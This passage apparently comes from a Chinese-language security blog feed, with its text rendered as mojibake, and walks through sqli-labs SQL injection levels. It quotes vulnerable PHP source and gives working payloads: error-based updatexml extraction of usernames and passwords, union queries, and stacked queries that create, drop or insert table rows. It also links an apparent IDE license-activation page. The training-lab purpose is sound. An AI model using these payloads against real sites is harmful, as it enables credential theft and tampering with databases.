<p>åœ¨è¾“å…¥ <code>1%df or 1=1#</code>åæŠ“åŒ…å¯ä»¥çœ‹åˆ°å‰é¢çš„<code>%df</code>å˜æˆäº†<code>%25df</code></p>
<p><code>uname=1%25df%27+or+1%3D1%23&amp;passwd=aa&amp;submit=Submit</code>ä¿®æ”¹ä¸€ä¸‹å³å¯</p>
<br>

<br>

<h3 id="35-å®½å­—èŠ‚æ³¨å…¥"><a href="#35-å®½å­—èŠ‚æ³¨å…¥" class="headerlink" title="35 å®½å­—èŠ‚æ³¨å…¥"></a>35 å®½å­—èŠ‚æ³¨å…¥</h3><p>å’Œ32å·®ä¸å¤š åªä¸è¿‡è¿™é‡Œæ˜¯å­—ç¬¦å‹ï¼Œä¸éœ€è¦<code>&#39;</code>é—­åˆ</p>
<p><code>?id=0 union select 1,database(),3</code></p>
<br>

<br>

<h3 id="36-å®½å­—èŠ‚æ³¨å…¥"><a href="#36-å®½å­—èŠ‚æ³¨å…¥" class="headerlink" title="36 å®½å­—èŠ‚æ³¨å…¥"></a>36 å®½å­—èŠ‚æ³¨å…¥</h3><p>å’Œå‰é¢ä¸€æ ·</p>
<p><code>?id=0%df%27%20union%20select%201,2,3--+</code></p>
<p>?id=0%df%27%20and%20updatexml(1,concat(0x7e,(select%20database()),0x7e),1)â€“+</p>
<br>

<h3 id="37-å®½å­—èŠ‚æ³¨å…¥-POST"><a href="#37-å®½å­—èŠ‚æ³¨å…¥-POST" class="headerlink" title="37 å®½å­—èŠ‚æ³¨å…¥(POST)"></a>37 å®½å­—èŠ‚æ³¨å…¥(POST)</h3><p>å’Œ34ä¸€æ ·</p>
<br>

<h3 id="38-å †å æ³¨å…¥"><a href="#38-å †å æ³¨å…¥" class="headerlink" title="38 å †å æ³¨å…¥"></a>38 å †å æ³¨å…¥</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=&#x27;<span class="subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;</span><br><span class="line"><span class="comment">/* execute multi query */</span></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">mysqli_multi_query</span>(<span class="variable">$con1</span>, <span class="variable">$sql</span>))</span><br><span class="line">&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* store first result set */</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$result</span> = <span class="title function_ invoke__">mysqli_store_result</span>(<span class="variable">$con1</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$row</span> = <span class="title function_ invoke__">mysqli_fetch_row</span>(<span class="variable">$result</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;font size = &quot;5&quot; color= &quot;#00FF00&quot;&gt;&#x27;</span>;	</span><br><span class="line">            <span class="title function_ invoke__">printf</span>(<span class="string">&quot;Your Username is : %s&quot;</span>, <span class="variable">$row</span>[<span class="number">1</span>]);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">            <span class="title function_ invoke__">printf</span>(<span class="string">&quot;Your Password is : %s&quot;</span>, <span class="variable">$row</span>[<span class="number">2</span>]);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="comment">//            mysqli_free_result($result);</span></span><br><span class="line">    &#125;</span><br><span class="line">        <span class="comment">/* print divider */</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">mysqli_more_results</span>(<span class="variable">$con1</span>))</span><br><span class="line">    &#123;</span><br><span class="line">            <span class="comment">//printf(&quot;-----------------\n&quot;);</span></span><br><span class="line">    &#125;</span><br><span class="line">     <span class="comment">//while (mysqli_next_result($con1));</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">    &#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&#x27;&lt;font size=&quot;5&quot; color= &quot;#FFFF00&quot;&gt;&#x27;</span>;</span><br><span class="line">	<span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">mysqli_error</span>(<span class="variable">$con1</span>));</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;  </span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">/* close connection */</span></span><br><span class="line"><span class="title function_ invoke__">mysqli_close</span>(<span class="variable">$con1</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>mysqli_multi_query()</code>å †å æ³¨å…¥ï¼Œå¤šä¸ªæŸ¥è¯¢ç”¨<code>;</code>åˆ†éš”</p>
<p>å‚è€ƒ<code>https://www.cnblogs.com/lcamry/p/5762905.html</code></p>
<p><code>?id=1&#39;;create table test like users --+</code></p>
<p>å‘ç°æ•°æ®åº“ä¸­æ–°å»ºäº†åçš„<code>test</code>çš„è¡¨</p>
<p><code>?id=1&#39;;drop table test; --+</code>åˆ é™¤<code>test</code>è¡¨</p>
<p>åœ¨<code>uers</code>è¡¨æ·»åŠ æ•°æ®</p>
<p><code>?id=1&#39;;insert into users(id,username,password) values(&#39;25&#39;,&#39;Mamor&#39;,&#39;Mamor&#39;)--+</code></p>
<br>

<h3 id="39-å †å æ³¨å…¥"><a href="#39-å †å æ³¨å…¥" class="headerlink" title="39 å †å æ³¨å…¥"></a>39 å †å æ³¨å…¥</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=<span class="subst">$id</span> LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>æ•°å­—å‹ ä¸éœ€è¦é—­åˆ</p>
<p><code>?id=1;insert into users(id,username,password) values(&#39;26&#39;,&#39;Mamor&#39;,&#39;Mamor&#39;) --+</code></p>
<br>

<h3 id="40-å †å æ³¨å…¥"><a href="#40-å †å æ³¨å…¥" class="headerlink" title="40 å †å æ³¨å…¥"></a>40 å †å æ³¨å…¥</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=(&#x27;<span class="subst">$id</span>&#x27;) LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure>

<p><code>?id=1&#39;) ; insert into users(id,username,password) values(&#39;40&#39;,&#39;Mamor&#39;,&#39;Mamor&#39;)--+</code></p>
<br>

<h3 id="41-å †å æ³¨å…¥"><a href="#41-å †å æ³¨å…¥" class="headerlink" title="41 å †å æ³¨å…¥"></a>41 å †å æ³¨å…¥</h3><p><code>?id=2-1 --+</code>å’Œ<code>?id=1 --+</code>è¿”å›ç»“æœä¸€æ ·</p>
<p>å¯ä»¥åˆ¤æ–­æ˜¯æ•°å­—å‹ï¼Œå’Œ39ä¸€æ ·</p>
<p><code>?id=1 ; insert into users(id,username,password) values(&#39;40&#39;,&#39;Mamor&#39;,&#39;Mamor&#39;)--+</code></p>
]]></content>
      <categories>
        <category>SQLi</category>
      </categories>
      <tags>
        <tag>SQLi</tag>
      </tags>
  </entry>
  <entry>
    <title>ideaæ¿€æ´»</title>
    <url>/posts/b49b0221/</url>
    <content><![CDATA[<p><a href="https://shimo.im/docs/jRRw9RR3hhxPHpKg/read">https://shimo.im/docs/jRRw9RR3hhxPHpKg/read</a></p>
]]></content>
      <categories>
        <category>IDEA</category>
      </categories>
      <tags>
        <tag>IDEA</tag>
      </tags>
  </entry>
  <entry>
    <title>sqli-labs2</title>
    <url>/posts/63ba4580/</url>
    <content><![CDATA[<h3 id="18-UAæ³¨å…¥"><a href="#18-UAæ³¨å…¥" class="headerlink" title="18 UAæ³¨å…¥"></a>18 UAæ³¨å…¥</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?</span> php</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_input</span>(<span class="params"><span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$value</span>))</span><br><span class="line">        &#123;</span><br><span class="line">        <span class="variable">$value</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$value</span>,<span class="number">0</span>,<span class="number">20</span>); <span class="comment">// truncation (see comments)</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">get_magic_quotes_gpc</span>())  <span class="comment">// Stripslashes if magic quotes enabled</span></span><br><span class="line">            &#123;</span><br><span class="line">            <span class="variable">$value</span> = <span class="title function_ invoke__">stripslashes</span>(<span class="variable">$value</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">ctype_digit</span>(<span class="variable">$value</span>))       <span class="comment">// Quote if not a number</span></span><br><span class="line">            &#123;</span><br><span class="line">            <span class="variable">$value</span> = <span class="string">&quot;&#x27;&quot;</span> . <span class="title function_ invoke__">mysql_real_escape_string</span>(<span class="variable">$value</span>) . <span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">        <span class="variable">$value</span> = <span class="title function_ invoke__">intval</span>(<span class="variable">$value</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$value</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br></pre></td></tr></table></figure>

<p><code>check_input()</code>å‡½æ•°å…ˆæˆªå–å‰20ä½ï¼Œ</p>
<p>å¦‚æœå¼€å¯GPC,å»æ‰åæ–œæ ï¼Œ</p>
<p>å¦‚æœæ˜¯åè¿›åˆ¶ï¼Œæœ‰éæ³•å­—ç¬¦å†è½¬è¯‘æ‰</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">$<span class="keyword">sql</span><span class="operator">=</span>&quot;SELECT  users.username, users.password FROM users WHERE users.username=$uname and users.password=$passwd ORDER BY users.id DESC LIMIT 0,1&quot;;</span><br><span class="line">  $result1 <span class="operator">=</span> mysql_query($<span class="keyword">sql</span>);</span><br><span class="line">  $row1 <span class="operator">=</span> mysql_fetch_array($result1);</span><br><span class="line">      if($row1)</span><br><span class="line">          &#123;</span><br><span class="line">          echo <span class="string">&#x27;&lt;font color= &quot;#FFFF00&quot; font size = 3 &gt;&#x27;</span>;</span><br><span class="line">          $<span class="keyword">insert</span><span class="operator">=</span>&quot;INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES (&#x27;$uagent&#x27;, &#x27;$IP&#x27;, $uname)&quot;;</span><br><span class="line">          mysql_query($<span class="keyword">insert</span>);</span><br><span class="line">          <span class="operator">/</span><span class="operator">/</span>echo <span class="string">&#x27;Your IP ADDRESS is: &#x27;</span> .$IP;</span><br><span class="line">          echo &quot;&lt;/font&gt;&quot;;</span><br><span class="line">          <span class="operator">/</span><span class="operator">/</span>echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">          echo <span class="string">&#x27;&lt;font color= &quot;#0000ff&quot; font size = 3 &gt;&#x27;</span>;            </span><br><span class="line">          echo <span class="string">&#x27;Your User Agent is: &#x27;</span> .$uagent;</span><br><span class="line">          echo &quot;&lt;/font&gt;&quot;;</span><br><span class="line">          echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">          print_r(mysql_error());            </span><br><span class="line">          echo &quot;&lt;br&gt;&lt;br&gt;&quot;;</span><br><span class="line">          echo <span class="string">&#x27;&lt;img src=&quot;../images/flag.jpg&quot;  /&gt;&#x27;</span>;</span><br><span class="line">          echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">          </span><br><span class="line">          &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">          &#123;</span><br><span class="line">          echo <span class="string">&#x27;&lt;font color= &quot;#0000ff&quot; font size=&quot;3&quot;&gt;&#x27;</span>;</span><br><span class="line">          <span class="operator">/</span><span class="operator">/</span>echo &quot;Try again looser&quot;;</span><br><span class="line">          print_r(mysql_error());</span><br><span class="line">          ... ... </span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œå¯¹<code>username</code>å’Œ<code>password</code>åšäº†å¤„ç†ï¼Œä½†æ²¡æœ‰å¯¹<code>UA</code>å¤„ç† è¿™é‡Œä½¿ç”¨UAÂ·</p>
<p>burp suiteæŠ“åŒ…æ”¹UA <code>1&#39; or updatexml(1,concat(0x7e,(database()),0x7e),0) or &#39;</code></p>
<h3 id="19-Refereræ³¨å…¥"><a href="#19-Refereræ³¨å…¥" class="headerlink" title="19 Refereræ³¨å…¥"></a>19 Refereræ³¨å…¥</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">$uname <span class="operator">=</span> check_input($_POST[<span class="string">&#x27;uname&#x27;</span>]);</span><br><span class="line">  $passwd <span class="operator">=</span> check_input($_POST[<span class="string">&#x27;passwd&#x27;</span>]);</span><br><span class="line">  ... ...</span><br><span class="line"></span><br><span class="line">$<span class="keyword">sql</span><span class="operator">=</span>&quot;SELECT  users.username, users.password FROM users WHERE users.username=$uname and users.password=$passwd ORDER BY users.id DESC LIMIT 0,1&quot;;</span><br><span class="line">  $result1 <span class="operator">=</span> mysql_query($<span class="keyword">sql</span>);</span><br><span class="line">  $row1 <span class="operator">=</span> mysql_fetch_array($result1);</span><br><span class="line">      if($row1)</span><br><span class="line">          &#123;</span><br><span class="line">          echo <span class="string">&#x27;&lt;font color= &quot;#FFFF00&quot; font size = 3 &gt;&#x27;</span>;</span><br><span class="line">          $<span class="keyword">insert</span><span class="operator">=</span>&quot;INSERT INTO `security`.`referers` (`referer`, `ip_address`) VALUES (&#x27;$uagent&#x27;, &#x27;$IP&#x27;)&quot;;</span><br><span class="line">          mysql_query($<span class="keyword">insert</span>);</span><br><span class="line">          <span class="operator">/</span><span class="operator">/</span>echo <span class="string">&#x27;Your IP ADDRESS is: &#x27;</span> .$IP;</span><br><span class="line">          echo &quot;&lt;/font&gt;&quot;;</span><br><span class="line">          <span class="operator">/</span><span class="operator">/</span>echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">          echo <span class="string">&#x27;&lt;font color= &quot;#0000ff&quot; font size = 3 &gt;&#x27;</span>;            </span><br><span class="line">          echo <span class="string">&#x27;Your Referer is: &#x27;</span> .$uagent;</span><br></pre></td></tr></table></figure>

<p>æ”¹Referer <code>1&#39; or updatexml(1,concat(0x7e,(database()),0x7e),0) or &#39;</code></p>
<h3 id="20-Cookieæ³¨å…¥"><a href="#20-Cookieæ³¨å…¥" class="headerlink" title="20 Cookieæ³¨å…¥"></a>20 Cookieæ³¨å…¥</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">$uname <span class="operator">=</span> check_input($_POST[<span class="string">&#x27;uname&#x27;</span>]);</span><br><span class="line">    $passwd <span class="operator">=</span> check_input($_POST[<span class="string">&#x27;passwd&#x27;</span>]);</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    $<span class="keyword">sql</span><span class="operator">=</span>&quot;SELECT  users.username, users.password FROM users WHERE users.username=$uname and users.password=$passwd ORDER BY users.id DESC LIMIT 0,1&quot;;</span><br><span class="line">    $result1 <span class="operator">=</span> mysql_query($<span class="keyword">sql</span>);</span><br><span class="line">    $row1 <span class="operator">=</span> mysql_fetch_array($result1);</span><br><span class="line">    $cookee <span class="operator">=</span> $row1[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">        if($row1)</span><br><span class="line">            &#123;</span><br><span class="line">            echo <span class="string">&#x27;&lt;font color= &quot;#FFFF00&quot; font size = 3 &gt;&#x27;</span>;</span><br><span class="line">            setcookie(<span class="string">&#x27;uname&#x27;</span>, $cookee, <span class="type">time</span>()<span class="operator">+</span><span class="number">3600</span>);    </span><br><span class="line">            header (<span class="string">&#x27;Location: index.php&#x27;</span>);</span><br><span class="line">            echo &quot;I LOVE YOU COOKIES&quot;;</span><br><span class="line">            echo &quot;&lt;/font&gt;&quot;;</span><br><span class="line">            echo <span class="string">&#x27;&lt;font color= &quot;#0000ff&quot; font size = 3 &gt;&#x27;</span>;            </span><br><span class="line">            <span class="operator">/</span><span class="operator">/</span>echo <span class="string">&#x27;Your Cookie is: &#x27;</span> .$cookee;</span><br><span class="line">            echo &quot;&lt;/font&gt;&quot;;</span><br><span class="line">            echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">            print_r(mysql_error());            </span><br><span class="line">            echo &quot;&lt;br&gt;&lt;br&gt;&quot;;</span><br><span class="line">            echo <span class="string">&#x27;&lt;img src=&quot;../images/flag.jpg&quot; /&gt;&#x27;</span>;</span><br><span class="line">            echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">            &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">            echo <span class="string">&#x27;&lt;font color= &quot;#0000ff&quot; font size=&quot;3&quot;&gt;&#x27;</span>;</span><br><span class="line">            <span class="operator">/</span><span class="operator">/</span>echo &quot;Try again looser&quot;;</span><br><span class="line">            print_r(mysql_error());</span><br></pre></td></tr></table></figure>

<p>æ”¹Cookie </p>
<p><code>uname=1.9&#39; and 1=1 union select 1,2,table_name from information_schema.tables where table_schema=&#39;security&#39; limit 0,1  #</code>æˆ–è€…</p>
<p><code>uname=1&#39; and updatexml(1,concat(0x7e,(select * from ( select concat(username,password) from users limit 0,1)a),0x7e),1)#</code></p>
<br>

<br>

<h3 id="21"><a href="#21" class="headerlink" title="21"></a>21</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">if(<span class="operator">!</span>isset($_POST[<span class="string">&#x27;submit&#x27;</span>]))</span><br><span class="line">    &#123;</span><br><span class="line">        $cookee <span class="operator">=</span> $_COOKIE[<span class="string">&#x27;uname&#x27;</span>];</span><br><span class="line">        $format <span class="operator">=</span> <span class="string">&#x27;D d M Y - H:i:s&#x27;</span>;</span><br><span class="line">        $<span class="type">timestamp</span> <span class="operator">=</span> <span class="type">time</span>() <span class="operator">+</span> <span class="number">3600</span>;</span><br><span class="line">        ... ...</span><br><span class="line"></span><br><span class="line">        $cookee <span class="operator">=</span> base64_decode($cookee);</span><br><span class="line">        $<span class="keyword">sql</span><span class="operator">=</span>&quot;SELECT * FROM users WHERE username=(&#x27;$cookee&#x27;) LIMIT 0,1&quot;;</span><br><span class="line">        </span><br><span class="line">        ... ...</span><br></pre></td></tr></table></figure>

<p>å’Œ20å…³ç›¸æ¯”ï¼Œå¤šäº†base64ç¼–ç  ï¼Œè¿™ä¸ªä½¿ç”¨<code>&#39;)</code>é—­åˆ</p>
<p><code>uname=1&#39;) and updatexml(1,concat(0x7e,(select * from ( select concat_ws(&#39;:&#39;,username,password) from users limit 0,1)a),0x7e),1)#</code> base64ä¸€ä¸‹</p>
<p><code>MScpIGFuZCB1cGRhdGV4bWwoMSxjb25jYXQoMHg3ZSwoc2VsZWN0ICogZnJvbSAoIHNlbGVjdCBjb25jYXRfd3MoJzonLHVzZXJuYW1lLHBhc3N3b3JkKSBmcm9tIHVzZXJzIGxpbWl0IDAsMSlhKSwweDdlKSwxKSM=</code></p>
<h3 id="22"><a href="#22" class="headerlink" title="22"></a>22</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">if(<span class="operator">!</span>isset($_POST[<span class="string">&#x27;submit&#x27;</span>]))</span><br><span class="line">        &#123;</span><br><span class="line">            $cookee <span class="operator">=</span> $_COOKIE[<span class="string">&#x27;uname&#x27;</span>];</span><br><span class="line">            ... ... </span><br><span class="line">            $cookee <span class="operator">=</span> base64_decode($cookee);</span><br><span class="line">            $cookee1 <span class="operator">=</span> <span class="string">&#x27;&quot;&#x27;</span>. $cookee. <span class="string">&#x27;&quot;&#x27;</span>;</span><br><span class="line">            $<span class="keyword">sql</span><span class="operator">=</span>&quot;SELECT * FROM users WHERE username=$cookee1 LIMIT 0,1&quot;;</span><br></pre></td></tr></table></figure>

<p><code>&quot;</code>é—­åˆï¼Œå…¶ä½™å’Œ21ç›¸åŒ</p>
<br>

<h3 id="23-è¢«è¿‡æ»¤-å•å¼•å·é—­åˆ-æŠ¥é”™æ³¨å…¥"><a href="#23-è¢«è¿‡æ»¤-å•å¼•å·é—­åˆ-æŠ¥é”™æ³¨å…¥" class="headerlink" title="23 #```-- è¢«è¿‡æ»¤ å•å¼•å·é—­åˆ æŠ¥é”™æ³¨å…¥"></a>23 <code>#```-- </code>è¢«è¿‡æ»¤ å•å¼•å·é—­åˆ æŠ¥é”™æ³¨å…¥</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>

<p><code>#</code>å’Œ<code>-- </code>è¢«è¿‡æ»¤äº† ä½¿ç”¨<code>&#39;</code>é—­åˆ</p>
<p><code>?id=1&#39; and &#39;1&#39;=&#39;1</code></p>
<p><code>?id=1&#39;%20 order by 5 and &#39;1&#39;=&#39;1</code>æ— æ³•é€šè¿‡è¿™ç§æ–¹å¼åˆ¤æ–­å­—æ®µæ•°</p>
<p><code>?id=-1&#39; union select 1,2 and &#39;1&#39;=&#39;1</code>æŠ¥é”™</p>
<p><code>?id=-1&#39; union select 1,2,3 and &#39;1&#39;=&#39;1</code>ä¸æŠ¥é”™</p>
<p><code>?id=-1&#39; union select 1,2,3 and &#39;1&#39;=&#39;1</code>æŠ¥é”™</p>
<p>å¯ä»¥åˆ¤æ–­æœ‰ä¸‰ä¸ªå­—æ®µï¼Œ2ï¼Œ3æ˜¯å›æ˜¾ç‚¹ï¼Œä½†æ˜¯3å¤„è¾“å‡ºç»“æœåªæœ‰0å’Œ1ï¼Œä¼°è®¡æ˜¯å¸ƒå°”å‹ï¼Œæ‰€ä»¥æŠŠ2å½“ä½œè¾“å‡ºç‚¹</p>
<p>å½“ç„¶è¿™é‡Œäº¦å¯ä»¥ä½¿ç”¨æŠ¥é”™æ³¨å…¥ï¼Œç›¸å¯¹ç®€å•ç‚¹</p>
<p><code>?id=-1&#39; and updatexml(1,concat(0x7e,database(),0x7e),1) and &#39;1&#39;=&#39;1</code></p>
<br>

<br>

<h3 id="24-äºŒæ¬¡æ³¨å…¥"><a href="#24-äºŒæ¬¡æ³¨å…¥" class="headerlink" title="24 äºŒæ¬¡æ³¨å…¥"></a>24 äºŒæ¬¡æ³¨å…¥</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># pass_change.php</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//including the Mysql connect parameters.</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;../sql-connections/sql-connect.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># Validating the user input........</span></span><br><span class="line">    <span class="variable">$username</span>= <span class="variable">$_SESSION</span>[<span class="string">&quot;username&quot;</span>];</span><br><span class="line">    <span class="variable">$curr_pass</span>= <span class="title function_ invoke__">mysql_real_escape_string</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;current_password&#x27;</span>]);</span><br><span class="line">    <span class="variable">$pass</span>= <span class="title function_ invoke__">mysql_real_escape_string</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]);</span><br><span class="line">    <span class="variable">$re_pass</span>= <span class="title function_ invoke__">mysql_real_escape_string</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;re_password&#x27;</span>]);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$pass</span>==<span class="variable">$re_pass</span>)</span><br><span class="line">    &#123;    </span><br><span class="line">        <span class="variable">$sql</span> = <span class="string">&quot;UPDATE users SET PASSWORD=&#x27;<span class="subst">$pass</span>&#x27; where username=&#x27;<span class="subst">$username</span>&#x27; and password=&#x27;<span class="subst">$curr_pass</span>&#x27; &quot;</span>;</span><br><span class="line">        <span class="variable">$res</span> = <span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&#x27;You tried to be smart, Try harder!!!! :( &#x27;</span>);</span><br><span class="line">        <span class="variable">$row</span> = <span class="title function_ invoke__">mysql_affected_rows</span>();</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;font size=&quot;3&quot; color=&quot;#FFFF00&quot;&gt;&#x27;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;center&gt;&#x27;</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$row</span>==<span class="number">1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Password successfully updated&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location: failed.php&#x27;</span>);</span><br><span class="line">            <span class="comment">//echo &#x27;You tried to be smart, Try harder!!!! :( &#x27;;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;font size=&quot;5&quot; color=&quot;#FFFF00&quot;&gt;&lt;center&gt;&#x27;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Make sure New Password and Retype Password fields have same value&quot;</span>;</span><br><span class="line">        <span class="title function_ invoke__">header</span>(<span class="string">&#x27;refresh:2, url=index.php&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit1&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="title function_ invoke__">session_destroy</span>();</span><br><span class="line">    <span class="title function_ invoke__">setcookie</span>(<span class="string">&#x27;Auth&#x27;</span>, <span class="number">1</span> , <span class="title function_ invoke__">time</span>()-<span class="number">3600</span>);</span><br><span class="line">    <span class="title function_ invoke__">header</span> (<span class="string">&#x27;Location: index.php&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>åœ¨<code>update</code>åœ¨ä¿®æ”¹å¯†ç æ—¶ï¼Œ<code>$username</code>ç›´æ¥è·å–session å¹¶æ²¡æœ‰åšä»»ä½•è¿‡æ»¤å¤„ç†</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#login.php</span></span><br><span class="line"><span class="meta">&lt;?</span> php</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sqllogin</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">   <span class="variable">$username</span> = <span class="title function_ invoke__">mysql_real_escape_string</span>(<span class="variable">$_POST</span>[<span class="string">&quot;login_user&quot;</span>]);</span><br><span class="line">   <span class="variable">$password</span> = <span class="title function_ invoke__">mysql_real_escape_string</span>(<span class="variable">$_POST</span>[<span class="string">&quot;login_password&quot;</span>]);</span><br><span class="line">   <span class="variable">$sql</span> = <span class="string">&quot;SELECT * FROM users WHERE username=&#x27;<span class="subst">$username</span>&#x27; and password=&#x27;<span class="subst">$password</span>&#x27;&quot;</span>;</span><br><span class="line"><span class="comment">//$sql = &quot;SELECT COUNT(*) FROM users WHERE username=&#x27;$username&#x27; and password=&#x27;$password&#x27;&quot;;</span></span><br><span class="line">   <span class="variable">$res</span> = <span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&#x27;You tried to be real smart, Try harder!!!! :( &#x27;</span>);</span><br><span class="line">   <span class="variable">$row</span> = <span class="title function_ invoke__">mysql_fetch_row</span>(<span class="variable">$res</span>);</span><br><span class="line">    <span class="comment">//print_r($row) ;</span></span><br><span class="line">   <span class="keyword">if</span> (<span class="variable">$row</span>[<span class="number">1</span>]) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$row</span>[<span class="number">1</span>];</span><br><span class="line">   &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">              <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$login</span> = <span class="title function_ invoke__">sqllogin</span>();</span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$login</span>== <span class="number">0</span>) </span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&quot;username&quot;</span>] = <span class="variable">$login</span>;</span><br><span class="line">    <span class="title function_ invoke__">setcookie</span>(<span class="string">&quot;Auth&quot;</span>, <span class="number">1</span>, <span class="title function_ invoke__">time</span>()+<span class="number">3600</span>);  <span class="comment">/* expire in 15 Minutes */</span></span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location: logged-in.php&#x27;</span>);</span><br><span 